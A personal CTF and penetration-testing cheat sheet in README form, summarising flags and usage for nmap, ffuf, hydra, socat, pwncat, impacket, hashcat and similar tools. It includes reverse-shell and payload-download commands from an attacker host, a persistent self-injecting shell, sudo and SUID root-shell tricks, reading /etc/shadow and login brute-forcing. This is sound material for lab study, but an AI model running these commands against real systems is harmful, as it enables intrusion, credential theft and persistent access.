# CTF-CheatSheet
CTF CheatSheet that I created over time while solving CTFs and learning various pentesting techniques

## DNS Resolution
- Edit `/etc/hosts` to manage DNS resolution locally.

## Nmap <img src="https://images.contentstack.io/v3/assets/blt28ff6c4a2cf43126/blt2d8822c72b3fa47d/647726fad2aad85beae606cd/NMAP_1_Integrations_Feature_Array_Item_Image.png?auto=webp&disable=upscale&width=3840&quality=75" alt="Nmap Logo" width="50" style="vertical-align:middle;">
- `nmap -sV -p- <ip>`: Find open ports.
  - `-sV`: Version detection.
  - `-sC`: Use default scripts for further vulnerability detection.
  - `-sT`: TCP scan.
  - `-sU`: UDP scan.
  - `-T4`: Faster scan.
  - `-p-`: Scan all 65535 ports.
  - `-oN <output.txt> <ip>`: Save output to a file.
  - `-p <start>-<end>`: Specify port range.
  - `-sn`: Ping scan without port scanning (ICMP echo).
  - `-Pn`: Disable ICMP ping scan; use TCP-SYN instead (useful when ICMP is blocked)

## Masscan <img src="https://www.kali.org/tools/masscan/images/masscan-logo.svg" alt="Masscan Logo" width="40" style="vertical-align:middle;">
- Similar to Nmap but more aggressive and faster.

## AWS S3 <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/bc/Amazon-S3-Logo.svg/1712px-Amazon-S3-Logo.svg.png" alt="AWS Logo" width="40" style="vertical-align:middle;">
- `aws s3 ls --endpoint-url=http://s3.<URL> s3://thetoppers.htb`: List S3 buckets.
  - `aws configure`: Configure AWS settings.
  - `cp /path/ s3://bucket-name/path/to/s3/key`: Copy files to an S3 bucket.
  - `s3://<url>`: URL of the s3-Bucket

## Curl
- `curl -v <URL>`: Send HTTP requests.
  - `-v`: Verbose output. Detailed information about the request and the response.
  - `-H`: Specify custom headers.
  - `-X PUT --upload-file localfile.txt <url>`: Upload a file via PUT.
  - `-O <url>`: Download a file.
  - `-L`: Follow redirects.
  - `-X`: Specify the HTTP method, e.g. -X POST, for an HTTP POST request.
  - `-s`: Silent mode. (Suppress output of error messages and progress)
  - `-q`: Prevents automatic loading of the configuration file (achieves reproducible behavior)

## Gobuster <img src="https://www.kali.org/tools/gobuster/images/gobuster-logo.svg" alt="Gobuster Logo" width="40" style="vertical-align:middle;">
- `gobuster dir -u <URL> -w /path/to/wordlist.txt`: Brute force directories and files.
  - `-u`: URL to scan.
  - `-x`: Specify file extensions (e.g., `.php, .html`).
  - `-w`: Wordlist to use.
  - `-r`: Recursive search.
  - `-t`: Number of threads to speed up the scan.
  - `-d`: To specify the maximum search depth for recursive searches.

## Dirsearch <img src="https://www.kali.org/tools/dirsearch/images/dirsearch-logo.svg" alt="Dirsearch Logo" width="40" style="vertical-align:middle;">
- `dirsearch -u <URL> -e*`: Brute force directories with various extensions.
- `-e`: Specifies extensions (* for all)
- `-w`: Wordlist

## Ffuf <img src="https://www.kali.org/tools/ffuf/images/ffuf-logo.svg" alt="Ffuf Logo" width="40" style="vertical-align:middle;">
- `ffuf -u http://<URL>/FUZZ -w /path/to/wordlist.txt`
- `ffuf -u http://FUZZ.<URL> -w /path/to/wordlist.txt -H "Host: FUZZ.example.com"` (Subdomains)
  - `ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://<MACHINE_IP>`
- `ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.170.242/customers/signup -mr "username already exists"`
  - Brute force attack on the login form to identify existing usernames. 
- `ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.170.242/customers/login -fc 200`
  - Brute force attack on a login form. `-fc 200` ensures that only requests that do not return the HTTP status code 200 OK are displayed. (successful login)
  - `W1/W2`: placeholder
- `ffuf -u http://<URL>/FUZZ -w /path/to/wordlist.txt`: Fuzz URLs and directories.
- `-X POST -d "username=FUZZ&password=x"`: Test form submissions (e.g., login forms).


- `-H`: Use custom headers.
- `-w`: Wordlist
- `-X`: request method (e.g. POST or GET)
- `-d`: data which is sent
- `-u`: Url
- `-mr`: Text which we search on the page to see if the result was found. (e.g. “username already exists”)
- `-fc`: check HTTP status

## SSTI (Server-Side Template Injection)
- Exploit SSTI vulnerabilities using crafted template injection payloads. Process requests via Burpsuit and thereby utilize the response. 
  - Example reference: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
    - Predefined code which can be used.

## Burpsuite <img src="https://www.kali.org/tools/burpsuite/images/burpsuite-logo.svg" alt="BurpSuite Logo" width="40" style="vertical-align:middle;">
- Proxy tool to intercept, analyze, and manipulate HTTP/HTTPS traffic.
- Send request to Intruder and insert `§§` in field to execute bruteforce payload.
  - Payload: /usr/share/wordlists/SecLists/Passwords/Common-Credentials/best1050.txt

## Port Forwarding
- Forwards network traffic from a specific port on a computer to another destination. The server therefore thinks that the request is coming via localhost, for example.
- **local port forwarding**: Forwarding in the direction of the server (client port -> server)
- **remote port forwarding**: Forwarding in the direction of the client to a specific port (server port -> client)
- Use SSH to forward network traffic between ports.
  - `ssh -L 8080:localhost:80 user@example.com`: Local port forwarding.
  - `ssh -R`: Remote port forwarding.
  - `ssh -D`: Dynamic port forwarding.

## FTP
- `ftp example.com`: Establish FTP connection.
  - `put file.txt`: Upload a file.
  - `get file.txt`: Download a file.

## Netcat <img src="https://www.kali.org/tools/netcat/images/netcat-logo.svg" alt="Netcat Logo" width="40" style="vertical-align:middle;">
- Allows you to create network connections, transfer data and perform port scans.
  - `nc -nlvp 1234`: Start listening on port 1234 e.g. for reverse shells.
  - `-l`: Listen mode
  - `-v`: Verbose mode
  - `-n`: No DNS resolution
  - `-p`: Specifies port

## Shell Size Adjustment
- `stty -a`: Display current shell size.
- `stty rows <number>`: Adjust the number of rows.
- `stty cols <number>`: Adjust the number of cols.

## Socat
- Use for shell stabilisation and creating encrypted reverse shells.
  - On attacker machine: `sudo python3 -m http.server 80`
  - On victim machine: `wget <attacker-ip>/socat -O /tmp/socat`
  - Attacker: `socat TCP:<TARGET-IP>:<TARGET-PORT> `
  - Victim: `socat TCP-L:<PORT> EXEC:"bash -li"`: Run bash shell.

## Rlwrap
- Adds readline features (e.g., command history) to tools like Netcat.
  - `rlwrap nc -lvnp <port>`
    - `ctrl + z` -> `stty raw -echo; fg`: to stabilize shell in background and then to prevent `ctrl+c`

## SMBClient
- `smbclient \\\\IP\\Share -U username`: Connect to SMB share using specified username.
- `smbclient \\\\IP\\Admin$ -U Administrator`: Connect to SMB with admin credentials.
- `-L <Server>`: Lists all available shares.
- `-U`: Username
- `-N`: Do not ask for password


## Psexec.py (Impacket)
- Enables users to execute commands on remote Windows systems.
- in `/usr/share/doc/python3-impacket/examples`
- `python3 psexec.py administrator@ip`
> [!CAUTION]
> Easily recognized by Windows Defender in real life!


## MSSQLClient.py (Impacket) 
- Connect to Microsoft SQL server.
  - `python3 mssqlclient.py user@ip -windows-auth`
  - `xp_cmdshell "powershell -c cd C:\"`: Run PowerShell command.

## PEASS <img src="https://www.kali.org/tools/peass-ng/images/peass-ng-logo.svg" alt="PEASS Logo" width="40" style="vertical-align:middle;">
- **LinPEAS**: Tool for privilege escalation enumeration on _Linux_ systems.
- **WinPEAS**: Tool for privilege escalation enumeration on _Windows_ systems.

## GitTools (internetwache) <img src="https://avatars.githubusercontent.com/u/6023785?s=200&v=4" alt="Internetwache Logo" width="40" style="vertical-align:middle;">
- https://github.com/internetwache/GitTools.git/ 
- Tool to find/get websites with their .git repository available to the public.
- `./gitdumper.sh <URL> clone`: To clone the git repository found on website.
  - e.g. `./gitdumper.sh http://<URL>/.git/ clone`
- `git log`: To get the commit history.
- `git show <commit_hash>`: To get specific commit-object.

## Windows Commands
- `dir`: Equivalent to `ls`
- `type`: Equivalent to `cat`
- `powershell -c pwd`: Run PowerShell commands.
- `pwd`: Shows current path
- `powershell -c "Invoke-WebRequest -Uri http://<IP>/winshell_thm.exe -OutFile shell.exe"`: Download a file

## Windows user rights
- `whoami /priv`: Shows the user rights of the user.

## HTTP Server 
- Start a simple HTTP server:
  - `python3 -m http.server 80`
    - Http server listens on port 80 and provides current directory

## Gospider
- Web spidering tool for discovery and information gathering.
  - `gospider -s http://<IP>`
  - `-s`: Site to crawl

## Zip2John and Rar2John
- Extract hashes from ZIP or RAR files for cracking with John the Ripper.
- `zip2john <zip_file> > <output_file>`
- `rar2john <rar_file> > <output_file>`

## Keepass2John
- To prepare `.kdbx` file for JohnTheRipper
- `keepass2john <kdbx_file> > <output.file>`

## Gpg2John
- `gpg2john <asc_file> > <output_file>`

## GPG
- `gpg --import <asc_file>`: Imports private-key
- `gpg --decrypt <pgp_file>`: Decrypts `.pgp` file
- John may be needed to get passphrase to decrypt

## John the Ripper <img src="https://www.kali.org/tools/john/images/john-logo.svg" alt="John Logo" width="40" style="vertical-align:middle;">
- `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`: Crack password hashes.

## Fcrackzip
- Brute force password-protected ZIP files.

## Binwalk <img src="https://www.kali.org/tools/binwalk/images/binwalk-logo.svg" alt="Binwalk Logo" width="40" style="vertical-align:middle;">
- Tool for analyzing and extracting binary files. Recognition of embedded file signatures, compression and encoding detection.
  - `binwalk picture.png -e`: to extract embedded files

## Steghide
- Hide or extract data from image or audio files.
  - `steghide extract -sf picture.jpg`

## Hashid <img src="https://www.kali.org/tools/hashid/images/hashid-logo.svg" alt="Hashid Logo" width="40" style="vertical-align:middle;">
- Identify the hash type.
  - `hashid <hash>`

## Crackstation
- [CrackStation](https://crackstation.net/): Website to crack hashes

## GTFOBins <img src="https://gtfobins.github.io/assets/logo.png" alt="GTFOBinsLogo" width="40" style="vertical-align:middle;">
- [GTFOBins](https://gtfobins.github.io/): Possibilities for privesc

## Hashcat <img src="https://www.kali.org/tools/hashcat/images/hashcat-logo.svg" alt="Hashcat Logo" width="40" style="vertical-align:middle;">
- Hash cracking tool.
  - `hashcat -m 0 hash /usr/share/wordlists/rockyou.txt`: Crack MD5 hashes.
  - `-m 0`: MD5 hash

## SQLMap <img src="https://www.kali.org/tools/sqlmap/images/sqlmap-logo.svg" alt="SQLMap Logo" width="50" style="vertical-align:middle;">
- Automatically detect and exploit SQL injection vulnerabilities.

## Tcpdump <img src="https://www.kali.org/tools/tcpdump/images/tcpdump-logo.svg" alt="Tcpdumb Logo" width="40" style="vertical-align:middle;">
- Capture network traffic and analyze packets.
  - `tcpdump -i eth0`: Capture traffic on the `eth0` interface.
  - `tcpdump -i eth0 host 192.168.1.1`: Capture traffic to/from a specific IP.
  - `tcpdump -i eth0 port 80`: Capture traffic on a specific port.


  - `-i <interface>`: Specify the network interface.
  - `-w <file.pcap>`: Write packets to a file.
  - `-r <file.pcap>`: Read from a file.
  - `port <number>`: Filter by port.
  - `-n`: Disable DNS resolution.
  - `-v`: Increase verbosity.

## Checksec
- Verify security settings of executables.

## Shell Upgrade
- Improve shell interactivity.
- `script /dev/null -c bash`

1. `python3 -c "import pty;pty.spawn('/bin/bash')"`: Starts an interactive bash shell via Python to make the shell more stable. 
2. `export TERM=xterm`: Sets the environment variable `TERM` to `xterm` to define the terminal properties correctly.
3. `ctrl+z`: Pauses the current shell to the background.
4. `stty raw -echo; fg`: Sets the terminal to raw mode and brings the shell back from the background to get a fully interactive shell.

## Pwncat unbreakable revShell <img src="https://github.com/cytopia/pwncat/blob/master/art/banner-1.png?raw=true" alt="Pwncat Logo" width="120" style="vertical-align:middle;">
- Once pwncat has injected itself into the target as an unbreakable reverse shell, you can use any local listener 
to answer as its request, e.g.: pwncat, netcat, ncat or similar.
- https://youtu.be/lN10hgl_Ts8?si=qcjrya240WDDconI
- `pwncat -l <port> --self-inject=<cmd>:<lhost>:<lport>`
  - e.g. `pwncat -l 1234 --self-inject=/bin/sh:<lhost>:1234`
  - then 'ctrl + c', and now you can always start a port listener, which automatically connects to the target
    - e.g. `pwncat -l 1234 -vv` or `nc -lp 1234 -vv`
      - `-vv`: more detailed verbose
> [!Note]
> Does not work on Windows remote hosts yet!

## Evil-WinRM <img src="https://www.kali.org/tools/evil-winrm/images/evil-winrm-logo.svg" alt="EvilWinRM Logo" width="40" style="vertical-align:middle;">
- Tool to establish a remote connection to a Windows computer.

## Metasploit <img src="https://www.kali.org/tools/metasploit-framework/images/metasploit-framework-logo.svg" alt="Metasploit Logo" width="40" style="vertical-align:middle;">
- Framework with a wide range of exploits and post-exploitation tools.
- `msfconsole`

## Searchsploit <img src="https://www.kali.org/tools/exploitdb/images/exploitdb-logo.svg" alt="searchsploit Logo" width="40" style="vertical-align:middle;">
- Allows users to search locally for known exploits and vulnerabilities in the Exploit DB.
  - `searchsploit --nmap a.xml`: Integrate with Nmap scans.

## Privesc (Privilege Escalation) 
- Use LinEnum for privilege escalation on Linux systems.
  - `find / -type f -perm -04000 -ls 2>/dev/null`: Search for SUID binaries.
  - `sudo -l`: See which commands the user can execute as sudo.
  - `sudo find . -exec /bin/sh \; -quit`: Opens a root shell, if user is sudoer.

## Base64
- `base64 /etc/shadow | base64 -d`: coded and decoded shadow

## Enum4Linux <img src="https://www.kali.org/tools/enum4linux/images/enum4linux-logo.svg" alt="Enum4Linux Logo" width="40" style="vertical-align:middle;">
- Gather SMB information from Linux.
- `enum4linux <options> <IP>`

## Hydra <img src="https://www.kali.org/tools/hydra/images/hydra-logo.svg" alt="Hydra Logo" width="50" style="vertical-align:middle;">
- Brute force attacks for various protocols like SSH, FTP, HTTP, etc.
  - `hydra -t 4 -l <username> -P /usr/share/wordlists/rockyou.txt -vV <IP> ftp`
  - `hydra -l <username> -P <wordlist> 10.10.0.191 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V`
    - `/login`: Login page
    - `F=incorrect`: Is a string that appears in the server reply when the login fails
    
  - `-t`: Number of threads
  - `-l`: Username
  - `-P`: Path to wordlist
  - `-vV`: Verbose

## NFS
- Mount the directory locally and store the bash file with the SUID bit set (`chmod +s`) as root. 
- **SUID-Bit**: File is executed with the rights of the owner. 
- Then execute bash -> bash as root

## MySQL <img src="https://1000logos.net/wp-content/uploads/2020/08/MySQL-Logo.png" alt="Mysql Logo" width="50" style="vertical-align:middle;">
- `mysql -h <IP> -U <username> -p`
- `-p`: Request password

## Hexditor
- Change file signatures. Helpful, when upload signature is checked.
- Change the first number of hex characters to a permitted file type.
  -  Insert number of characters beforehand (e.g. AAAA), which are then changed with Hexditor.
  - https://en.wikipedia.org/wiki/List_of_file_signatures

## Mimikatz <img src="https://www.kali.org/tools/mimikatz/images/mimikatz-logo.svg" alt="MimikatzLogo" width="40" style="vertical-align:middle;">
- Extract passwords and hashes on Windows.

## Unshadow
- Convert `/etc/passwd` and `/etc/shadow` to a format usable by John the Ripper

## Socket connection
- `ss -tulpn`: Lists socket connections
  - `-t`: TCP-Sockets
  - `-u`: UDP-Sockets
  - `-l`: Only listening sockets (open ports)
  - `-p`: Shows processes
  - `-n`: Shows IPs

## SSH Tunneling
- Use SSH to create tunnels and bypass firewalls.
- `ssh -L 10000:localhost:10000 <user>@<IP>`
  - Forwards the local port 10000 (on your computer) to port 10000 on localhost of the remote server. 
  For servers, it looks like the request comes from local.

## Wordpress Scan <img src="https://www.kali.org/tools/wpscan/images/wpscan-logo.svg" alt="WPScan Logo" width="50" style="vertical-align:middle;">
- It scans the WordPress-website for known vulnerabilities in plugins, themes and the WordPress installation itself.
- `wpscan --url <URL> -e`
- `wpscan --url <URL> -U <username> -P /usr/share/wordlists/rockyou.txt`
- `-e`: Enumeration

## Sudo command history
- `grep 'COMMAND=' /var/log/auth.log`: Shows the sudo command history

## Search for files
- `find / -name <filename> 2>/dev/null`
  - `2>/dev/null` redirects error messages to nowhere.
- `find / -type -f -name "<keyword>*"`: Finds all files with the keyword at the beginning.
  - `-f`: Files
- `find / -type -f -name "*<keyword>*"`: Finds all files with the keyword anywhere.

## Nikto <img src="https://www.kali.org/tools/nikto/images/nikto-logo.svg" alt="Nikto Logo" width="40" style="vertical-align:middle;">
- Scan web servers and web applications for security vulnerabilities.
- `nikto -h <URL/IP> -p <port>`
- `nikto -h <URL/IP> -o results.html -Format html`: Performs scan and saves result in html file.

## SCP
- To transfer files/folders between Linux systems.
- `scp <username>@<remote_IP>:<remote_file/path> <local_directory>`: Copies file/folder from target to attacker. (get)
- `scp <local_file/path> <username>@<remote_IP>:<remote_directory>`: copies file/folder from attacker to target. (put)


